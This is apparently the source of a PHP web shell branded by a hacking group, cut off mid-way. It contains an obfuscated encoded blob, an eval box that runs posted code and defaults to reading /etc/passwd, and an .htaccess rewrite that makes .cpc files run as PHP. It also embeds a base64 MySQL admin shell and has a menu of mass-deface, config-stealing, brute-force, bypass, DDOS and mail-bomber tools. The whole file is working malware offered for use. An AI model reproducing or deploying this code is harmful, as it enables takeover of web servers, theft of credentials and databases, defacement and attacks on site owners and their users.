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';
?>
<html><head><link rel="SHORTCUT ICON" href="http://www.toolsteam.com/styles/tools/statusicon/forum_old-48.png"><title>BANGLADESH LEVEL SEVEN HACKERS PRIV8 SH3LL BY SID GIFARI</title>
    <script language="javascript" type="text/javascript">
        function resizeIframe(obj) {
            obj.style.height = obj.contentWindow.document.body.scrollHeight + 'px';
        }
    </script>



    <script type="text/javascript">
        function tukar(lama,baru){
            document.getElementById(lama).style.display = 'none';
            document.getElementById(baru).style.display = 'block';
        }
    </script>
    <style type="text/css">
        select{
            width: 150px;
            height: 20px;
            padding: 1px;
            color: blue;
        }
        select option { color:  #blue; }
        select option:first-child{
            color: blue;
        }

        body{
            background:#blue;;
        }
        a {
            text-decoration:none;
        }
        a:hover{
            border-bottom:1px solid #1b992a;
        }
        *{
            font-size:10px;
            font-family:Tahoma, Geneva, sans-serif;
            color:  #ffffff;
        }
        #menu{
            background:none;
            margin:8px 2px 4px 2px;
        }
        #menu a{
            padding:3px 10px;
            margin:0;
            background: #000000;
            text-decoration:none;
            letter-spacing:2px;
            -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
        }
        #menu a:hover{
            background:#191919;
            border-bottom:1px solid #333333;
            border-top:1px solid #333333;
        }
        .tabnet{
            margin:15px auto 0 auto;
            border: 1px solid #333333;
        }
        .main {
            width:100%;
        }
        .gaya {
            color: #156801;
        }
        .inputz{
            background:#050505;
            border:0;
            padding:2px;
            border-bottom:1px solid #222222;
            border-top:1px solid #222222;
        }
        .inputzbut{
            background:#111111;
            color:#d10000;
            margin:0 4px;
            border:1px solid #444444;

        }
        .inputz:hover, .inputzbut:hover{
            border-bottom:1px solid #00ff00;
            border-top:1px solid #00ff00;
        }
        .output {
            margin:auto;
            border:1px solid #145a32;
            width:100%;
            height:400px;
            background:#000000;
            padding:0 2px;
        }
        .cmdbox{
            width:100%;
        }
        .head_info{
            padding: 0 4px;
        }
        .jaya{ font-family: ;}

        .b374k{
            font-size:30px;
            padding:0;
            color:#444444;
        }
        .b374k_tbl{
            text-align:center;
            margin:0 4px 0 0;
            padding:0 4px 0 0;
            border-right:0px solid #333333;
        }
        .phpinfo table{
            width:100%;
            padding:0 0 0 0;
        }
        .phpinfo td{
            background:#111111;
            color:#3355ff;
            padding:6px 8px;;
        }
        .phpinfo th, th{
            background:#191919;
            border-bottom:1px solid #333333;
            font-weight:normal;
        }
        .phpinfo h2, .phpinfo h2 a{
            text-align:center;
            font-size:16px;
            padding:0;
            margin:30px 0 0 0;
            background:#222222;
            padding:4px 0;
        }
        .explore{
            width:100%;
        }
        .explore a {
            text-decoration:none;
        }
        .explore td{
            border-bottom:1px solid #333333;
            padding:0 8px;
            line-height:24px;
        }
        .explore th{
            padding:3px 8px;
            font-weight:normal;
        }
        .explore th:hover , .phpinfo th:hover{
            border-bottom:1px solid #00ff00;
        }
        .explore tr:hover{
            background:#111111;
        }
        .viewfile{
            background:#ff3333;
            color:#000000;
            margin:4px 2px;
            padding:8px;
        }
        .sembunyi{
            display:none;
            padding:0;margin:0;
        }

    </style></head>
<script language='javascript'>
    if (document.all||document.getElementById){
        var thetitle=document.title
        document.title=''
    }
    var data="";
    var done=1;
    function statusIn(text){
        decrypt(text,22,22);
    }
    function statusOut(){
        self.status='';
        done=1;
    }
    function decrypt(text, max, delay){
        if (done){
            done = 0;
            rantit(text, max, delay, 0, max);
        }
    }
    function rantit(text, runs_left, delay, charvar, max){
        if (!done){
            runs_left = runs_left - 1;
            var status = text.substring(0,charvar);
            for(var current_char = charvar; current_char < text.length; current_char++){
                status += data.charAt(Math.round(Math.random()*data.length));
            }
            document.title = status;
            var rerun = "rantit('" + text + "'," + runs_left + "," + delay + "," + charvar + "," + max + ");"
            var new_char = charvar + 1;
            var next_char = "rantit('" + text + "'," + max + "," + delay + "," + new_char + "," + max + ");"
            if(runs_left > 0){
                setTimeout(rerun, delay);
            }
            else{
                if (charvar < text.length){
                    setTimeout(next_char, Math.round(delay*(charvar+3)/(charvar+1)));
                }
                else
                {
                    done = 1;
                }
            }
        }
    }
    if (document.all||document.getElementById)
        statusIn(thetitle)
</script>

<body onLoad="document.getElementById('cmd').focus();" bgcolor="#000" marginwidth="0" marginheight="0" style="background: black url(https://games.mail.ru/pic/pc/gallery/d6/93/5df4e2e8.jpeg)

no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover;

background-size:cover;" onload="type_text()" bottommargin="0" rightmargin="0" leftmargin="0" topmargin="0">
<div class="main">
    <!-- head info start here -->
    <div class="head_info"><center>
            <table class="b374k_tbl"><a href="?"><span class="b374k"><img src="https://i.imgsafe.org/485eefc.png" /></span><br></a><b>BANGLADESH LEVEL SEVEN HACKERS Sh3ll</b><br>-= W e__A r e__B D__L E V E L__7 =-<hr><center><?php echo $buff; ?><center></td></tr></table></td>

            </tr></center>
    </div>
    <!-- head info end here -->
    <!-- menu start -->
    <center><div id="menu">
            <a href="?<?php echo "y=".$pwd; ?>">Home</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=indomieseleraku">Server Info</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">Net Sploit</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">Mysql</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface BY Sid Gifari</a>
            <a href="?<?php echo "y=".$pwd;	?>&amp;x=zhp">Zone-H</a>
            <a href="?<?php echo "y=".$pwd;	?>&amp;x=jumpingz">Jumping Server</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=grabconfig">Config KIller BY Sid Gifari</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlinkmenu">Symlink</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain Viewer</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">DB Dump</a><br><br>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=cpmenu">Cpanel Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=bfmenu">BruteForce Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=bypasmenu">Bypass Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=wpmenu">WordPress Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=jmmenu">Joomla Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=litespeedconfig">LitespeedConfig</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=config">Config</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Password Hash</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=string">Script Encode Decode</a><br><br>
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=autoxploit">Auto Expliot</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=tools">Tools</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">DDOS</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=whois">Whois</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcsdec">WHMCS Decoder</a>
            <a href="?<?php echo "y=".$pwd;	?>&amp;x=bingreverse">Reverse IP</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=mailerz">Mailer Inbox</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=mailfilter">Mail Filter</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=mailbomber">Mail Bomber</a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=shellfinder">Shell Finder</a>
            <a href="?<?php echo "y=".$pwd;	?>&amp;x=about">About</a>
           
            <br><br>
        </div></center>
    <!-- menu end -->

    <?php

    @ini_set('display_errors', 0);
    if(isset($_GET['x']) && ($_GET['x'] == 'php')){ ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
            <table class="cmdbox">
                <tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
    echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
                <tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
        </table>
        </form>

    <?php }

    elseif(isset($_GET['x']) && ($_GET['x'] == 'sql'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&amp;x=sql" method="post">
        <?php
        echo "<center/><br/><b><font color=#red>+--==[ Mysql Interface ]==--+</font></b><br><br>";
        mkdir('mysql', 0755);
        chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
        $sqlshell = 'PD8NCiRQQVNTV09SRCA9ICJyb290X3hoYWhheCI7DQokVVNFUk5BTUUgPSAieGhhaGF4IjsNCmlmICggZnVuY3Rpb25fZXhpc3RzKCdpbmlfZ2V0JykgKSB7DQoJJG9ub2ZmID0gaW5pX2dldCgncmVnaXN0ZXJfZ2xvYmFscycpOw0KfSBlbHNlIHsNCgkkb25vZmYgPSBnZXRfY2ZnX3ZhcigncmVnaXN0ZXJfZ2xvYmFscycpOw0KfQ0KaWYgKCRvbm9mZiAhPSAxKSB7DQoJQGV4dHJhY3QoJEhUVFBfU0VSVkVSX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfQ09PS0lFX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfUE9TVF9GSUxFUywgRVhUUl9TS0lQKTsNCglAZXh0cmFjdCgkSFRUUF9QT1NUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfR0VUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfRU5WX1ZBUlMsIEVYVFJfU0tJUCk7DQp9DQoNCmZ1bmN0aW9uIGxvZ29uKCkgew0KCWdsb2JhbCAkUEhQX1NFTEY7DQoJc2V0Y29va2llKCAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICk7DQoJZWNobyAiPHRhYmxlIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCU+PHRyPjx0ZD48Y2VudGVyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9Mj48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjx0YWJsZSBjZWxscGFkZGluZz0yMD48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjxoMT5NeVNRTCBJbnRlcmZhY2UgQnkgUzRNUDRIPC9oMT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Ykc5bmIyNWZjM1ZpYldsMD5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxwYWRkaW5nPTUgY2VsbHNwYWNpbmc9MT5cbiI7DQoJZWNobyAiPHRyPjx0ZCBjbGFzcz1cIm5ld1wiPkhvc3RuYW1lIDwvdGQ+PHRkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9aG9zdG5hbWUgdmFsdWU9J2xvY2FsaG9zdCc+PC90ZD48L3RyPlxuIjsNCgllY2hvICI8dHI+PHRkIGNsYXNzPVwibmV3XCI+VXNlcm5hbWUgPC90ZD48dGQ+IDxpbnB1dCB0eXBlPXRleHQgbmFtZT11c2VybmFtZT48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjx0cj48dGQgY2xhc3M9XCJuZXdcIj5QYXNzd29yZCA8L3RkPjx0ZD4gPGlucHV0IHR5cGU9cGFzc3dvcmQgbmFtZT1wYXNzd29yZD48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nRW50ZXInPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1yZXNldCB2YWx1ZT0nQ2xlYXInPjxicj5cbiI7DQoJZWNobyAiPC9mb3JtPlxuIjsNCgllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJZWNobyAiPC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+XG4iOw0KCWVjaG8gIjxwPjxociB3aWR0aD0zMDA+XG4iOw0KCWVjaG8gIjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbG9nb25fc3VibWl0KCkgew0KCWdsb2JhbCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGhvc3RuYW1lICwkUEhQX1NFTEY7DQoJaWYoJGhvc3RuYW1lID09JycpDQoJCSRob3N0bmFtZSA9ICdsb2NhbGhvc3QnOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl91c2VybmFtZSIsICR1c2VybmFtZSApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIsICRwYXNzd29yZCApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIsICRob3N0bmFtZSApOw0KCWVjaG8gIjxNRVRBIEhUVFAtRVFVSVY9UmVmcmVzaCBDT05URU5UPScwOyBVUkw9JFBIUF9TRUxGP2FjdGlvbj1iR2x6ZEVSQ2N3PT0nPiI7DQp9DQoNCmZ1bmN0aW9uIGVjaG9RdWVyeVJlc3VsdCgpIHsNCglnbG9iYWwgJHF1ZXJ5U3RyLCAkZXJyTXNnOw0KCWlmKCAkZXJyTXNnID09ICIiICkgJGVyck1zZyA9ICJTdWNjZXNzIjsNCglpZiggJHF1ZXJ5U3RyICE9ICIiICkgew0KCQllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9NT5cbiI7DQoJCWVjaG8gIjx0cj48dGQ+UXVlcnk8L3RkPjx0ZD4kcXVlcnlTdHI8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8dHI+PHRkPlJlc3VsdDwvdGQ+PHRkPiRlcnJNc2c8L3RkPjwvdHI+XG4iOw0KCQllY2hvICI8L3RhYmxlPjxwPlxuIjsNCgl9DQp9DQoNCmZ1bmN0aW9uIGxpc3REYXRhYmFzZXMoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJFBIUF9TRUxGOw0KCWVjaG8gIjxoMT5EYXRhYmFzZXMgTGlzdDwvaDE+XG4iOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWNyZWF0ZURCPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9ZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBEYXRhYmFzZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGhyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz01PlxuIjsNCgkkcERCID0gbXlzcWxfbGlzdF9kYnMoICRteXNxbEhhbmRsZSApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBEQiApOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRkYm5hbWUgPSBteXNxbF9kYm5hbWUoICRwREIsICRpICk7DQoJCWVjaG8gIjx0cj5cbiI7DQoJCWVjaG8gIjx0ZD4kZGJuYW1lPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWxpc3RUYWJsZXMmZGJuYW1lPSRkYm5hbWUnPlRhYmxlczwvYT48L3RkPlxuIjsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcERCJmRibmFtZT0kZGJuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgRGF0YWJhc2UgXCckZGJuYW1lXCc/JylcIj5Ecm9wPC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kdW1wREImZGJuYW1lPSRkYm5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHVtcCBEYXRhYmFzZSBcJyRkYm5hbWVcJz8nKVwiPkR1bXA8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gY3JlYXRlRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2NyZWF0ZV9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbGlzdERhdGFiYXNlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRGF0YWJhc2UoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCW15c3FsX2Ryb3BfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCWxpc3REYXRhYmFzZXMoKTsNCn0NCg0KZnVuY3Rpb24gbGlzdFRhYmxlcygpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkUEhQX1NFTEY7DQoJZWNobyAiPGgxPlRhYmxlcyBMaXN0PC9oMT5cbiI7DQoJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Y3JlYXRlVGFibGU+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9dGFibGVuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NyZWF0ZSBUYWJsZSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9cXVlcnk+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT10ZXh0IHNpemU9MTIwIG5hbWU9cXVlcnlTdHI+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUXVlcnknPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBUYWJsZSA9IG15c3FsX2xpc3RfdGFibGVzKCAkZGJuYW1lICk7DQoJaWYoICRwVGFibGUgPT0gMCApIHsNCgkJJG1zZyAgPSBteXNxbF9lcnJvcigpOw0KCQllY2hvICI8aDM+RXJyb3IgOiAkbXNnPC9oMz48cD5cbiI7DQoJCXJldHVybjsNCgl9DQoJJG51bSA9IG15c3FsX251bV9yb3dzKCAkcFRhYmxlICk7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJG51bTsgJGkrKyApIHsNCgkJJHRhYmxlbmFtZSA9IG15c3FsX3RhYmxlbmFtZSggJHBUYWJsZSwgJGkgKTsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZWNobyAiPHRkPlxuIjsNCgkJZWNobyAiJHRhYmxlbmFtZVxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5EYXRhPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5Ecm9wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHVtcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0R1bXAgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5EdW1wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPiI7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZVRhYmxlKCkgew0KDQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkNSRUFURSBUQUJMRSAkdGFibGVuYW1lICggbm8gSU5UICkiOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbXlzcWxfcXVlcnkoICRxdWVyeVN0ciwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJbGlzdFRhYmxlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wVGFibGUoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkRST1AgVEFCTEUgJHRhYmxlbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyLCAkbXlzcWxIYW5kbGUgKTsNCgkkZXJyTXNnID0gbXlzcWxfZXJyb3IoKTsNCglsaXN0VGFibGVzKCk7DQp9DQoNCmZ1bmN0aW9uIHZpZXdTY2hlbWEoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJZWNobyAiPGgxPlRhYmxlIFNjaGVtYTwvaDE+XG4iOw0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvUXVlcnlSZXN1bHQoKTsNCgllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWFkZEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRmllbGQ8L2E+IHwgXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5WaWV3IERhdGE8L2E+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgIlNIT1cgZmllbGRzIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJZWNobyA